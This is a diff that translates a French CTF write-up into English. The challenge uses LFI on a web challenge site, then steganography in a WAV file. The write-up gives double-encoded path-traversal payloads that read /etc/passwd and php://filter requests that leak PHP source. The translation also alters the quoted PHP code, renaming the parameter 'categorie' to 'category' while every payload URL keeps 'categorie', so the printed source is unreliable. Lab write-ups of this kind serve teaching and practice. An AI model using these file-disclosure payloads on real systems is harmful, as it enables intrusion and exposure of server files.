@@ -1,77 +1,75 @@
 # CTF Midnight Flag : INFEKTION
 
-## Web / Stéganographie
+## Web / Steganography
 
 ### To be private or not to be private 
 
-**Difficulté :** Facile
+**Difficulty:** Easy
 
 ***
 
-L'énoncé du challenge nous donne le site suivant : `https://cloud.midnightflag.fr/index.php`
+The challenge statement gives us the following site: `https://cloud.midnightflag.fr/index.php`
 
-En manipulant l'URL, je m'aperçois rapidement qu'une faille LFI est exploitable.
-Je commence donc à injecter un payload avec double encodage afin de récupérer le contenu du fichier **/etc/passwd** :
+By manipulating the URL, I quickly realize that a LFI vulnerability is exploitable.
+So I start to inject a payload with double encoding in order to get the content of the file **/etc/passwd** :
 `https://cloud.midnightflag.fr/index.php?categorie=..%252f..%252f..%252fetc%252fpasswd`
 
-J'ai bien le contenu du fichier en retour mais je ne vois aucun utilisateur ou service exploitable :
+I have the content of the file in return but I don't see any exploitable user or service:
 
 ![cloud1](https://user-images.githubusercontent.com/49941629/165366730-29a98123-13f2-47a2-ad28-a2bf67c8165f.png)
 
-Je décide donc de télécharger le contenu du fichier index.php grâce au wrapper PHP :
+So I decide to download the content of the index.php file with the PHP wrappers:
 `https://cloud.midnightflag.fr/index.php?categorie=php:%252F%252Ffilter%252Fconvert.base64-encode%252Fresource=index.php`
 
-Avec cette requête, je récupère le contenu du fichier index.php en base64 directement sur la page web.
+With this request, I get the content of the index.php file in base64 directly on the web page.
 
-Après décodage, je vois le code PHP suivant correspondant aux filtres LFI appliqués (bypass de la fonction via double encodage) :
+After decoding, I see the following PHP code corresponding to the LFI filters applied (bypassing the function via double encoding):
 ```php
-    <?php
-    function lfi_filter($value)
-    {
-        $omit_words = array('..', '../', '/');
-        rsort($omit_words);
-        $new_string = str_replace($omit_words, '', $value);
-        return $new_string;
-    }
-    
-    if (isset($_GET["categorie"])) {
-      $categorie = lfi_filter($_GET["categorie"]);
-      include urldecode($categorie);
-    }else {
-      include 'home.php';
-    }
-    ?>
+    <?php
+    function lfi_filter($value)
+    {
+        $omit_words = array('..', '../', '/');
+        rsort($omit_words);
+        $new_string = str_replace($omit_words, '', $value);
+        return $new_string;
+    }
+    
+    if (isset($_GET["category"])) {
+      $categorie = lfi_filter($_GET["category"]);
+      include urldecode($categorie);
+    }else {
+      include 'home.php';
+    }
+    ?>
 ```
-A partir de cet instant, je cherche un petit moment avant de poursuivre le challenge car le code PHP récupéré nous donne aucune information supplémentaire.
-Le fuzzing n'étant pas autorisé sur ce challenge, il est venu le temps du **#guessing** !
+From this moment, I look for a little moment before continuing the challenge because the recovered PHP code gives us no additional information.
+Since fuzzing is not allowed on this challenge, it's time for **#guessing**!
 
-En regardant le titre du challenge et en adéquation avec la structure du site, après plusieurs tentatives je tente de joindre la page private.php : `https://cloud.midnightflag.fr/index.php?categorie=private.php` et j'ai bien un retour !
+Looking at the title of the challenge and in adequacy with the structure of the site, after several attempts I try to join the page private.php: `https://cloud.midnightflag.fr/index.php?categorie=private.php` and I have a return!
 
-Je récupère donc le code source de cette page avec le même payload que précédemment :
+So I get the source code of this page with the same payload as before:
 `https://cloud.midnightflag.fr/index.php?categorie=php:%252F%252Ffilter%252Fconvert.base64-encode%252Fresource=private.php`
 
-J'obtiens le code source suivant avec un commentaire ASCII intéressant :
+I get the following source code with an interesting ASCII comment:
 ```html
 <section>
-      <td><img width="50%" class="center" src="categorie\private\Why-So-Sad-Funny-Clown-Face-Picture.jpg" alt="personal_attack.jpg"></td>
+      <td><img width="50%" class="center" src="categorie\Why-So-Sad-Funny-Clown-Face-Picture.jpg" alt="personal_attack.jpg"></td>
       <!--don't leak (\x70\x65\x72\x73\x6F\x6E\x61\x6C) -->
 </section>
 ```
 
-Après conversion, je récupère la valeur suivante : **personal**
+After conversion, I get the following value: **personal**
 
-Je suppose donc que le site possède une catégorie personal, je me rends donc sur l'URL `https://cloud.midnightflag.fr/index.php?categorie=personal.php` qui contient un enregistrement audio au format wav.
+I suppose that the site has a personal category, so I go to the URL `https://cloud.midnightflag.fr/index.php?categorie=personal.php` which contains an audio recording in wav format.
 
-Après téléchargement de l'enregistrement audio, je l'ouvre avec le logiciel Audacity afin d'analyser le contenu.
+After downloading the audio recording, I open it with the Audacity software in order to analyze the content.
 
-L'audio généré par l'enregistrement me laisse penser qu'une information est présente dans le spectrogramme :
+The audio generated by the recording leads me to believe that an information is present in the spectrogram :
 
 https://user-images.githubusercontent.com/49941629/165365721-bf3fb966-fcdc-4e0e-a0d3-49bad9cf47e8.mp4
 
-Après inversion de la piste audio et analyse du spectre, je récupère l'information suivante :
+After inversion of the audio track and analysis of the spectrum, I recover the following information:
 
 ![cloud2](https://user-images.githubusercontent.com/49941629/165366030-8d6061f3-34d3-4f9b-8bfd-6a262bef336e.png)
 
-Flag : MCTF{H1d3_Y0uR_S3cRe7s}
-
-Merci au créateur du challenge.
+Flag: MCTF{H1d3_Y0uR_S3cRe7s}
